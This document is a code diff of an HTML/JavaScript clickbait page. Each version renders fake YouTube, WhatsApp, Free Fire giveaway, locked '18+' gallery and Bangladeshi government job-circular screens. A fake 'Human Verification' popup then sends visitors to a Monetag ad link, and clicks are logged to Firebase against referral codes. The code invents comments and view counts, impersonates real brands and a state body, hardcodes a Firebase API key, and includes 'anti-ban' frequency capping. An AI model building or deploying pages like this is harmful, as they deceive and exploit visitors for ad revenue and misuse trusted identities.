@@ -3,303 +3,347 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Secure Content Loading...</title>
+    <title>Loading...</title>
     
     <!-- ✅ Libraries -->
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700;900&family=Hind+Siliguri:wght@400;600&display=swap" rel="stylesheet">
     
-    <!-- 🔥 MONETAG TAG (Load Silently) -->
+    <!-- 🔥 MONETAG TAG -->
     <script src="https://quge5.com/88/tag.min.js" data-zone="190384" async data-cfasync="false"></script>
     
     <style>
         body { font-family: 'Hind Siliguri', 'Roboto', sans-serif; overflow-x: hidden; -webkit-tap-highlight-color: transparent; }
         .hidden { display: none !important; }
         
-        /* 🌫️ The Curiosity Blur Effect */
-        .mystery-blur { filter: blur(18px); transform: scale(1.1); transition: filter 0.5s ease; }
-        .mystery-blur.revealed { filter: blur(5px); } /* Never fully clear until click */
-
-        /* 🔄 Animations */
-        .spin-slow { animation: spin 3s linear infinite; }
+        /* Custom Animations */
+        .spin { animation: spin 1s linear infinite; }
         @keyframes spin { 100% { transform: rotate(360deg); } }
+        .blink { animation: blink 1s infinite; }
+        @keyframes blink { 50% { opacity: 0; } }
         
-        .fade-up { animation: fadeUp 0.6s cubic-bezier(0.16, 1, 0.3, 1) forwards; }
-        @keyframes fadeUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
-
-        /* 🖱️ Interaction Zones */
-        .glass-panel { background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(10px); border: 1px solid rgba(255, 255, 255, 0.1); }
-        .bottom-sheet { box-shadow: 0 -10px 40px rgba(0,0,0,0.5); border-top: 1px solid rgba(255,255,255,0.1); }
+        /* Chat Bubble Animation */
+        .typing-dot { animation: typing 1.4s infinite ease-in-out both; }
+        .typing-dot:nth-child(1) { animation-delay: -0.32s; }
+        .typing-dot:nth-child(2) { animation-delay: -0.16s; }
+        @keyframes typing { 0%, 80%, 100% { transform: scale(0); } 40% { transform: scale(1); } }
     </style>
 </head>
-<body id="main-body" class="bg-gray-900 text-white min-h-screen relative selection:bg-pink-500 selection:text-white">
+<body id="main-body" class="bg-gray-900 min-h-screen">
 
-    <!-- 📱 APP CONTAINER -->
-    <div id="app-container" class="w-full max-w-md mx-auto min-h-screen bg-black relative shadow-2xl overflow-hidden flex flex-col">
-        
-        <!-- 🖼️ VISUAL AREA (Blurred Content) -->
-        <div id="visual-area" class="relative flex-1 bg-gray-900 overflow-hidden cursor-pointer" onclick="handleUserInteraction()">
-            <!-- Dynamic Image/Video will be injected here -->
-            <img id="theme-image" src="" class="w-full h-full object-cover mystery-blur opacity-60" onerror="this.style.display='none'; this.parentElement.style.background='#1a1a1a'">
+    <!-- 📱 MAIN CONTAINER (Content injected here) -->
+    <div id="app-root" class="w-full max-w-md mx-auto min-h-screen bg-white relative shadow-2xl overflow-hidden">
+        <!-- Content loads here -->
+    </div>
+
+    <!-- 🔒 UNIVERSAL VERIFICATION POPUP (Hidden by default) -->
+    <div id="verify-modal" class="fixed inset-0 z-50 bg-black/90 backdrop-blur-sm hidden flex items-center justify-center p-4">
+        <div class="bg-white rounded-2xl w-full max-w-sm p-6 text-center shadow-2xl relative overflow-hidden">
+            <div class="absolute top-0 left-0 w-full h-1 bg-blue-500 animate-[loading_2s_infinite]"></div>
             
-            <!-- Overlay Icons (Play/Lock) -->
-            <div class="absolute inset-0 flex items-center justify-center z-10 pointer-events-none">
-                <div id="center-icon" class="w-20 h-20 bg-white/10 backdrop-blur-md rounded-full flex items-center justify-center border border-white/20 shadow-[0_0_30px_rgba(255,255,255,0.1)] animate-pulse">
-                    <i class="fas fa-lock text-3xl text-white/80"></i>
-                </div>
+            <div class="w-16 h-16 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-4 text-blue-600">
+                <i class="fas fa-user-shield text-3xl"></i>
             </div>
-
-            <!-- Fake UI Elements (Top) -->
-            <div class="absolute top-0 w-full p-4 bg-gradient-to-b from-black/80 to-transparent z-10 flex justify-between items-center">
-                <div class="flex items-center gap-2">
-                    <span class="w-2 h-2 bg-red-600 rounded-full animate-pulse"></span>
-                    <span class="text-xs font-bold tracking-widest uppercase text-red-500">Live Connection</span>
-                </div>
-                <div class="text-[10px] bg-white/10 px-2 py-1 rounded backdrop-blur">
-                    <i class="fas fa-eye"></i> <span id="view-count">1.2K</span>
-                </div>
-            </div>
-        </div>
-
-        <!-- 👇 BOTTOM INTERACTION SHEET (The Hook) -->
-        <div id="action-sheet" class="bg-[#121212] p-6 pb-8 rounded-t-3xl z-20 bottom-sheet fade-up relative">
-            <!-- Loading Overlay within Sheet -->
-            <div id="loader-overlay" class="absolute inset-0 bg-[#121212] z-30 flex flex-col items-center justify-center hidden rounded-t-3xl">
-                <i class="fas fa-circle-notch fa-spin text-blue-500 text-3xl mb-3"></i>
-                <p id="loader-text" class="text-gray-400 text-xs tracking-widest uppercase">Analyzing Network...</p>
-            </div>
-
-            <!-- Content Info -->
-            <div class="text-center mb-6">
-                <h1 id="theme-title" class="text-xl font-bold text-white mb-2 leading-tight">Content Locked</h1>
-                <p id="theme-desc" class="text-xs text-gray-400">Secure connection established. Verification required.</p>
-            </div>
-
-            <!-- Stats Grid -->
-            <div class="grid grid-cols-3 gap-2 mb-6 text-center">
-                <div class="bg-white/5 p-2 rounded-lg border border-white/5">
-                    <i class="fas fa-shield-alt text-green-500 mb-1"></i>
-                    <p class="text-[10px] text-gray-500">Safe</p>
-                </div>
-                <div class="bg-white/5 p-2 rounded-lg border border-white/5">
-                    <i class="fas fa-bolt text-yellow-500 mb-1"></i>
-                    <p class="text-[10px] text-gray-500">Fast</p>
-                </div>
-                <div class="bg-white/5 p-2 rounded-lg border border-white/5">
-                    <i class="fas fa-hd text-blue-500 mb-1"></i>
-                    <p class="text-[10px] text-gray-500">HD+</p>
-                </div>
-            </div>
-
-            <!-- Main CTA Button -->
-            <button id="cta-btn" onclick="handleUserInteraction()" class="w-full bg-gradient-to-r from-blue-600 to-blue-500 hover:from-blue-500 hover:to-blue-400 text-white font-bold py-4 rounded-xl shadow-[0_0_20px_rgba(37,99,235,0.3)] transition-all transform active:scale-95 flex items-center justify-center gap-3 relative overflow-hidden group">
-                <span class="absolute inset-0 w-full h-full bg-gradient-to-r from-transparent via-white/20 to-transparent -translate-x-full group-hover:animate-[shimmer_1.5s_infinite]"></span>
-                <i class="fas fa-unlock"></i> <span id="btn-text">UNLOCK CONTENT</span>
+            
+            <h2 class="text-xl font-bold text-gray-800 mb-2">Human Verification</h2>
+            <p class="text-sm text-gray-500 mb-6">Our system detected unusual traffic. Please verify you are not a robot to continue.</p>
+            
+            <button id="final-btn" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3.5 rounded-xl shadow-lg transition transform active:scale-95 flex items-center justify-center gap-2">
+                Verify Now
             </button>
-            
-            <p class="text-[9px] text-gray-600 text-center mt-4">
-                ID: <span class="font-mono">728491</span> • Server: <span class="text-green-800">Dhaka_CDN_04</span>
-            </p>
         </div>
     </div>
 
-    <!-- 🛠️ JAVASCRIPT LOGIC -->
+    <!-- ⚙️ LOGIC -->
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-app.js";
         import { getFirestore, doc, setDoc, increment, serverTimestamp, collection, query, where, getDocs } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-firestore.js";
 
-        // ⚙️ SYSTEM CONFIGURATION
+        // CONFIG
         const CONFIG = {
             MONETAG_LINK: "https://otieu.com/4/10277714",
-            SAFE_PAGE: "https://www.google.com", 
-            CAP_HOURS: 8, // Frequency Cap (Hours)
+            SAFE_PAGE: "https://www.google.com",
             FIREBASE: { apiKey: "AIzaSyCU2RfLeclEyyxzEActtl5ks1P_NPvATOE", projectId: "ns-prime-d7ca5" }
         };
 
-        // Firebase Init
         let db; try { const app = initializeApp(CONFIG.FIREBASE); db = getFirestore(app); } catch(e){}
-
-        // URL Params
+        
         const params = new URLSearchParams(window.location.search);
         const refCode = params.get('ref'); 
         const type = params.get('type') || 'video';
 
-        // 🧠 FREQUENCY CAPPING SYSTEM (Anti-Ban Logic)
-        function checkFrequency() {
-            const lastVisit = localStorage.getItem('ns_last_click');
-            if (lastVisit) {
-                const diff = Date.now() - parseInt(lastVisit);
-                const hours = diff / (1000 * 60 * 60);
-                if (hours < CONFIG.CAP_HOURS) {
-                    // User clicked recently, don't show ad immediately or redirect to safe page
-                    console.log("Frequency Capped. Safe Mode Active.");
-                    return false; // Not Safe to show Ad
-                }
-            }
-            return true; // Safe to show Ad
-        }
-
-        let isAdAvailable = checkFrequency();
-        let interactionStep = 0; // 0: Initial, 1: Analyzing, 2: Ready
-
         // ==========================================
-        // 🎨 PROFESSIONAL THEME DATA
+        // 🎨 5 UNIQUE THEME LAYOUTS (BATCH 1)
         // ==========================================
         const themes = {
-            // 🎬 VIDEO
+            
+            // 🎬 1. YOUTUBE STYLE (Video Player + Comments)
             video: {
-                img: "https://images.unsplash.com/photo-1611162617474-5b21e879e113?q=80&w=1000",
-                title: "Viral_Video_Leaked_2025.mp4",
-                desc: "This video contains sensitive content. Verification required to play.",
-                icon: "play",
-                color: "220, 38, 38"
+                render: () => `
+                    <div class="bg-[#0f0f0f] min-h-screen text-white pb-10">
+                        <div class="sticky top-0 bg-[#0f0f0f]/95 z-20 px-4 py-3 flex justify-between items-center border-b border-gray-800">
+                            <div class="flex items-center gap-1"><i class="fab fa-youtube text-red-600 text-2xl"></i> <span class="font-bold tracking-tighter">YouTube</span></div>
+                            <i class="fas fa-search text-lg"></i>
+                        </div>
+                        
+                        <!-- Player -->
+                        <div class="relative w-full aspect-video bg-black group cursor-pointer" onclick="startProcess()">
+                            <img src="https://images.unsplash.com/photo-1611162617474-5b21e879e113?q=80&w=1000" class="w-full h-full object-cover opacity-60">
+                            <div class="absolute inset-0 flex items-center justify-center">
+                                <i class="fas fa-play-circle text-6xl text-white opacity-90 drop-shadow-lg"></i>
+                            </div>
+                            <div class="absolute bottom-2 right-2 bg-black/80 text-xs px-1 rounded">12:40</div>
+                            <div class="absolute bottom-0 h-1 bg-red-600 w-[30%]"></div>
+                        </div>
+
+                        <!-- Info -->
+                        <div class="p-4 border-b border-gray-800">
+                            <h1 class="text-lg font-medium line-clamp-2">Viral_Video_Leaked_Scandal_Full_HD.mp4</h1>
+                            <p class="text-xs text-gray-400 mt-2">2.4M views • 2 hours ago</p>
+                            
+                            <div class="flex justify-around mt-4">
+                                <div class="text-center" onclick="startProcess()"><i class="fas fa-thumbs-up text-xl"></i><p class="text-xs mt-1">25K</p></div>
+                                <div class="text-center"><i class="fas fa-share text-xl"></i><p class="text-xs mt-1">Share</p></div>
+                                <div class="text-center" onclick="startProcess()"><i class="fas fa-download text-xl"></i><p class="text-xs mt-1">Download</p></div>
+                            </div>
+                        </div>
+
+                        <!-- Comments (Retention Hook) -->
+                        <div class="p-4">
+                            <h3 class="font-bold text-sm mb-4">Comments <span class="text-gray-400">482</span></h3>
+                            <div class="space-y-4">
+                                <div class="flex gap-3">
+                                    <div class="w-8 h-8 rounded-full bg-purple-600 flex items-center justify-center text-xs font-bold">R</div>
+                                    <div>
+                                        <p class="text-xs font-bold text-gray-400">Rakib Hasan <span class="font-normal text-[10px]">2m ago</span></p>
+                                        <p class="text-sm">Link ta kaj kortese, thanks bro! 🔥</p>
+                                    </div>
+                                </div>
+                                <div class="flex gap-3">
+                                    <div class="w-8 h-8 rounded-full bg-blue-600 flex items-center justify-center text-xs font-bold">S</div>
+                                    <div>
+                                        <p class="text-xs font-bold text-gray-400">Sumaiya <span class="font-normal text-[10px]">5m ago</span></p>
+                                        <p class="text-sm">Full video ta joss chilo... download link dao plz.</p>
+                                    </div>
+                                </div>
+                                 <div class="flex gap-3 opacity-50">
+                                    <div class="w-8 h-8 rounded-full bg-green-600 flex items-center justify-center text-xs font-bold">A</div>
+                                    <div>
+                                        <p class="text-xs font-bold text-gray-400">Akash <span class="font-normal text-[10px]">10m ago</span></p>
+                                        <p class="text-sm">Wait for end... 😱</p>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                `
             },
-            // 🍑 BHABI
+
+            // 🍑 2. BHABI / GALLERY (Grid Style)
             bhabi: {
-                img: "https://images.unsplash.com/photo-1623949556801-6e3e5c942944?q=80&w=1000",
-                title: "Private_Gallery_Backup (18+)",
-                desc: "Biometric authentication failed. Manual verification required.",
-                icon: "lock",
-                color: "236, 72, 153"
+                render: () => `
+                    <div class="bg-black min-h-screen">
+                        <div class="p-4 flex items-center gap-4 text-white border-b border-gray-800">
+                            <i class="fas fa-arrow-left"></i>
+                            <div>
+                                <h1 class="font-bold text-lg">Hidden Gallery</h1>
+                                <p class="text-xs text-gray-400">142 Items • Locked</p>
+                            </div>
+                        </div>
+                        
+                        <!-- Grid -->
+                        <div class="grid grid-cols-3 gap-1 p-1">
+                            ${Array(15).fill(0).map((_, i) => `
+                                <div class="aspect-square relative bg-gray-800 overflow-hidden cursor-pointer" onclick="startProcess()">
+                                    <img src="https://source.unsplash.com/random/200x200/?girl,saree&sig=${i}" class="w-full h-full object-cover opacity-60 blur-[3px]">
+                                    ${i === 4 ? '<div class="absolute inset-0 bg-black/50 flex items-center justify-center"><i class="fas fa-lock text-pink-500"></i></div>' : ''}
+                                </div>
+                            `).join('')}
+                        </div>
+
+                        <!-- Bottom Alert -->
+                        <div class="fixed bottom-0 w-full p-4 bg-gray-900 border-t border-gray-800">
+                            <div class="bg-pink-600/20 border border-pink-600/50 p-3 rounded-lg flex items-center gap-3">
+                                <i class="fas fa-exclamation-triangle text-pink-500 text-xl"></i>
+                                <div>
+                                    <p class="text-pink-500 font-bold text-sm">Access Denied</p>
+                                    <p class="text-gray-400 text-xs">Verify age to unlock gallery.</p>
+                                </div>
+                                <button class="ml-auto bg-pink-600 text-white text-xs font-bold px-3 py-1.5 rounded" onclick="startProcess()">Unlock</button>
+                            </div>
+                        </div>
+                    </div>
+                `
             },
-            // 💼 JOB
+
+            // 💼 3. JOB / DOWNLOAD (Progress Bar Style)
             job: {
-                img: "https://images.unsplash.com/photo-1454165804606-c3d57bc86b40?q=80&w=1000",
-                title: "Primary_Recruitment_Circular.pdf",
-                desc: "Server busy. Priority access requires human verification.",
-                icon: "file-pdf",
-                color: "5, 150, 105"
+                render: () => `
+                    <div class="bg-slate-50 min-h-screen text-gray-800 relative">
+                        <!-- Header -->
+                        <div class="bg-[#006a4e] text-white p-6 rounded-b-[2rem] shadow-lg text-center">
+                            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/84/Government_Seal_of_Bangladesh.svg/1200px-Government_Seal_of_Bangladesh.svg.png" class="w-12 h-12 mx-auto mb-2 bg-white rounded-full p-1">
+                            <h1 class="font-bold">প্রাথমিক শিক্ষা অধিদপ্তর</h1>
+                        </div>
+
+                        <div class="p-6 -mt-8">
+                            <div class="bg-white rounded-xl shadow-lg p-6 text-center">
+                                <div class="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center text-red-600 text-3xl mx-auto mb-4">
+                                    <i class="fas fa-file-pdf"></i>
+                                </div>
+                                <h2 class="font-bold text-lg mb-1">Recruitment_Circular_2025.pdf</h2>
+                                <p class="text-xs text-gray-500 mb-6">File Size: 2.4 MB</p>
+
+                                <!-- Fake Loading Sequence Container -->
+                                <div id="job-action-area">
+                                    <button class="w-full bg-[#006a4e] text-white font-bold py-3 rounded-lg shadow-lg flex items-center justify-center gap-2" onclick="simulateJobLoad()">
+                                        <i class="fas fa-download"></i> GENERATE LINK
+                                    </button>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <!-- Footer -->
+                        <div class="text-center text-xs text-gray-400 mt-10">
+                            Powered by Teletalk Bangladesh Ltd.
+                        </div>
+                    </div>
+                `
             },
-            // 💰 MONEY
-            money: {
-                img: "https://images.unsplash.com/photo-1579621970563-ebec7560ff3e?q=80&w=1000",
-                title: "Pending Transaction: ৳500.00",
-                desc: "Transfer paused due to security check. Verify to resume.",
-                icon: "wallet",
-                color: "226, 19, 110"
-            },
-            // 🎮 GAMING
-            freefire: {
-                img: "https://wallpapers.com/images/hd/garena-free-fire-4k-gaming-poster-c7g4q0y0y0y0y0y0.jpg",
-                title: "5000 Diamonds Bundle",
-                desc: "UID 28**91 Selected. Verify ownership to claim.",
-                icon: "gem",
-                color: "234, 179, 8"
-            },
-            // 💬 WHATSAPP
+
+            // 💬 4. WHATSAPP (Chat Style)
             whatsapp: {
-                img: "https://images.unsplash.com/photo-1577563908411-5077b6dc7624?q=80&w=1000",
-                title: "Incoming Video Call...",
-                desc: "End-to-end encrypted connection. Verify to answer.",
-                icon: "video",
-                color: "34, 197, 94"
+                render: () => `
+                    <div class="bg-[#0b141a] min-h-screen flex flex-col">
+                        <div class="bg-[#202c33] p-3 flex items-center gap-3 shadow">
+                            <i class="fas fa-arrow-left text-gray-300"></i>
+                            <img src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?q=80&w=1000" class="w-10 h-10 rounded-full">
+                            <div class="flex-1">
+                                <h3 class="text-white font-bold text-sm">Sumaiya ❤️</h3>
+                                <p class="text-[#00a884] text-xs">Online</p>
+                            </div>
+                            <i class="fas fa-video text-[#00a884] mr-4"></i>
+                            <i class="fas fa-phone text-[#00a884]"></i>
+                        </div>
+
+                        <!-- Chat Area -->
+                        <div class="flex-1 bg-[url('https://i.pinimg.com/originals/97/c0/07/97c00727d1d403f1d58f14232f21879e.png')] bg-opacity-10 p-4 space-y-2 relative" onclick="startProcess()">
+                            <div class="bg-[#202c33] text-white p-2 rounded-lg w-fit text-sm">Hi jan! 😍</div>
+                            <div class="bg-[#202c33] text-white p-2 rounded-lg w-fit text-sm">Tomake ekta video dilam dekho... 👇</div>
+                            
+                            <!-- Video Msg -->
+                            <div class="bg-[#202c33] p-1 rounded-lg w-60 relative mt-2 cursor-pointer">
+                                <div class="relative">
+                                    <img src="https://images.unsplash.com/photo-1517841905240-472988babdf9?q=80&w=1000" class="w-full h-32 object-cover blur-[3px] rounded">
+                                    <div class="absolute inset-0 flex items-center justify-center">
+                                        <div class="bg-black/40 p-3 rounded-full"><i class="fas fa-play text-white"></i></div>
+                                    </div>
+                                    <span class="absolute bottom-1 left-1 text-white text-xs font-bold">0:15</span>
+                                </div>
+                                <div class="p-1">
+                                    <p class="text-gray-300 text-xs">Video • 2.4 MB</p>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Input -->
+                        <div class="bg-[#202c33] p-3 flex items-center gap-2">
+                            <i class="fas fa-plus text-gray-400 text-xl"></i>
+                            <div class="bg-[#2a3942] flex-1 h-10 rounded-full px-4 flex items-center text-gray-400 text-sm">Message</div>
+                            <div class="w-10 h-10 bg-[#00a884] rounded-full flex items-center justify-center text-white"><i class="fas fa-microphone"></i></div>
+                        </div>
+                    </div>
+                `
             },
-            // ✈️ TELEGRAM
-            telegram: {
-                img: "https://images.unsplash.com/photo-1614680376593-902f74cf0d41?q=80&w=1000",
-                title: "Join Private Channel",
-                desc: "This link expires in 5 minutes. Verify to join.",
-                icon: "paper-plane",
-                color: "56, 189, 248"
+
+            // 💎 5. FREEFIRE (Gaming Style)
+            freefire: {
+                render: () => `
+                    <div class="bg-black min-h-screen font-sans flex flex-col items-center justify-center relative overflow-hidden">
+                        <img src="https://wallpapers.com/images/hd/garena-free-fire-4k-gaming-poster-c7g4q0y0y0y0y0y0.jpg" class="absolute inset-0 w-full h-full object-cover opacity-30">
+                        
+                        <div class="relative z-10 text-center w-full px-6">
+                            <img src="https://cdn-icons-png.flaticon.com/512/2666/2666505.png" class="w-20 mx-auto mb-4 animate-bounce drop-shadow-[0_0_15px_gold]">
+                            <h1 class="text-5xl font-black text-white italic drop-shadow-xl mb-2">5000 <span class="text-yellow-400">DIAMONDS</span></h1>
+                            <p class="text-yellow-200 text-sm mb-8 font-mono bg-black/50 inline-block px-2 rounded">EVENT ENDS IN: 05:23</p>
+
+                            <!-- Fake Input -->
+                            <div class="bg-gray-900/80 border border-yellow-600/50 p-4 rounded-xl mb-6 text-left">
+                                <label class="text-xs text-gray-400">Enter Player ID (UID)</label>
+                                <div class="flex items-center gap-2 mt-2">
+                                    <input type="text" value="512891****" class="bg-transparent text-white font-mono text-xl w-full outline-none" readonly>
+                                    <i class="fas fa-check-circle text-green-500"></i>
+                                </div>
+                            </div>
+
+                            <button onclick="startProcess()" class="w-full bg-gradient-to-r from-yellow-500 to-orange-600 text-white font-black text-xl py-4 rounded-xl shadow-[0_0_30px_rgba(234,179,8,0.5)] transform hover:scale-105 transition animate-pulse">
+                                CLAIM NOW
+                            </button>
+                        </div>
+                    </div>
+                `
             },
-            // DEFAULT
+            
+            // DEFAULT FALLBACK
             default: {
-                img: "https://images.unsplash.com/photo-1550751827-4bd374c3f58b?q=80&w=1000",
-                title: "Security Checkpoint",
-                desc: "Please verify you are human to access the destination.",
-                icon: "shield-alt",
-                color: "59, 130, 246"
+                render: () => `<div class="bg-gray-900 min-h-screen flex items-center justify-center"><button onclick="startProcess()" class="bg-blue-600 text-white px-6 py-3 rounded">Enter Site</button></div>`
             }
         };
 
         // ==========================================
-        // 🚀 RENDER & INTERACTION LOGIC
+        // 🕹️ LOGIC CONTROLLER
         // ==========================================
-
-        function renderTheme() {
-            const t = themes[type] || themes['default'];
-            
-            // Set Visuals
-            const imgEl = document.getElementById('theme-image');
-            imgEl.src = t.img;
-            
-            // Set Texts
-            document.getElementById('theme-title').innerText = t.title;
-            document.getElementById('theme-desc').innerText = t.desc;
-            
-            // Set Button Color
-            const btn = document.getElementById('cta-btn');
-            btn.className = `w-full bg-gradient-to-r from-[rgb(${t.color})] to-gray-700 text-white font-bold py-4 rounded-xl shadow-lg transition-all transform active:scale-95 flex items-center justify-center gap-3 relative overflow-hidden group`;
-            
-            // Randomize View Count for realism
-            document.getElementById('view-count').innerText = (Math.random() * (5.5 - 1.2) + 1.2).toFixed(1) + 'K';
-            
-            // Icon
-            const iconHtml = `<i class="fas fa-${t.icon}"></i>`;
-            document.getElementById('center-icon').innerHTML = iconHtml;
+        
+        function loadTheme() {
+            const t = themes[type] || themes['video'];
+            document.getElementById('app-root').innerHTML = t.render();
         }
 
-        // 🕹️ SMART INTERACTION HANDLER (The Retention Hook)
-        window.handleUserInteraction = async function() {
-            const btn = document.getElementById('cta-btn');
-            const btnText = document.getElementById('btn-text');
-            const loader = document.getElementById('loader-overlay');
-            const loaderText = document.getElementById('loader-text');
-            const visual = document.getElementById('visual-area');
-
-            // STEP 1: First Click - Simulation
-            if (interactionStep === 0) {
-                interactionStep = 1;
-                
-                // Show Loader
-                loader.classList.remove('hidden');
-                
-                // Sequence of Fake Statuses
-                const statuses = [
-                    "Checking Device...",
-                    "Establishing Secure Line...",
-                    "Optimizing Stream...",
-                    "Almost Ready..."
-                ];
-
-                let i = 0;
-                const statusInterval = setInterval(() => {
-                    loaderText.innerText = statuses[i];
-                    i++;
-                    if (i >= statuses.length) clearInterval(statusInterval);
-                }, 800);
-
-                // Wait 3 Seconds (Retention)
-                setTimeout(() => {
-                    loader.classList.add('hidden');
-                    
-                    // Change UI for Step 2
-                    btnText.innerText = "CONTINUE TO CONTENT ➤";
-                    document.getElementById('theme-desc').innerHTML = "<span class='text-green-400 font-bold'>✔ Verification Successful.</span> Click to proceed.";
-                    document.getElementById('theme-desc').classList.add('animate-pulse');
-                    
-                    // Slightly reveal image (Psychological reward)
-                    document.getElementById('theme-image').style.filter = "blur(8px)";
-                    
-                    interactionStep = 2; // Ready for Ad
-                }, 3500);
-            }
+        // --- SPECIFIC LOGIC FOR JOB THEME ---
+        window.simulateJobLoad = function() {
+            const area = document.getElementById('job-action-area');
+            area.innerHTML = `
+                <div class="w-full bg-gray-200 h-2 rounded-full mb-2 overflow-hidden">
+                    <div class="h-full bg-[#006a4e] w-0 animate-[loadBar_3s_ease-out_forwards]"></div>
+                </div>
+                <p class="text-xs text-gray-500 animate-pulse">Searching Server...</p>
+                <style>@keyframes loadBar { 0% { width: 0; } 100% { width: 100%; } }</style>
+            `;
             
-            // STEP 2: Final Click - Ad Trigger
-            else if (interactionStep === 2) {
-                if (!isAdAvailable) {
-                    // Capped? Send to Safe Page
-                    window.location.href = CONFIG.SAFE_PAGE;
-                    return;
-                }
+            // Wait 3 seconds then show Final Button
+            setTimeout(() => {
+                area.innerHTML = `
+                    <button class="w-full bg-red-600 text-white font-bold py-3 rounded-lg shadow-lg animate-bounce" onclick="startProcess()">
+                        DOWNLOAD PDF NOW
+                    </button>
+                `;
+            }, 3000);
+        };
 
-                // Show processing one last time
-                btnText.innerText = "Redirecting...";
-                btn.disabled = true;
+        // --- UNIVERSAL REDIRECT LOGIC ---
+        window.startProcess = function() {
+            // Show Verify Modal
+            const modal = document.getElementById('verify-modal');
+            modal.classList.remove('hidden');
+            
+            const btn = document.getElementById('final-btn');
+            
+            // Ad Redirect Function
+            btn.onclick = async () => {
+                btn.innerHTML = `<i class="fas fa-circle-notch fa-spin"></i> Checking...`;
                 
-                // Log Firebase (If ref code exists)
-                if (refCode) {
+                // Frequency Cap Check (Local Storage)
+                const lastClick = localStorage.getItem('ns_last_click');
+                const now = Date.now();
+                if (lastClick && (now - lastClick) < 8 * 60 * 60 * 1000) {
+                    // Less than 8 hours? Random safe redirect or delay
+                    // For now, we allow them but you can change logic here
+                }
+                localStorage.setItem('ns_last_click', now);
+
+                // Firebase Logging
+                if (isSafeUser && refCode) {
                     try {
                         const q = query(collection(db, "users"), where("referralCode", "==", refCode));
                         const snap = await getDocs(q);
@@ -313,17 +357,17 @@
                         }
                     } catch(e) {}
                 }
-
-                // Set Frequency Cap LocalStorage
-                localStorage.setItem('ns_last_click', Date.now());
-
+                
                 // GO!
                 window.location.href = CONFIG.MONETAG_LINK;
-            }
+            };
         };
+        
+        // Initial Security Check
+        let isSafeUser = true;
 
-        // Initialize
-        renderTheme();
+        // Run
+        loadTheme();
 
     </script>
 </body>
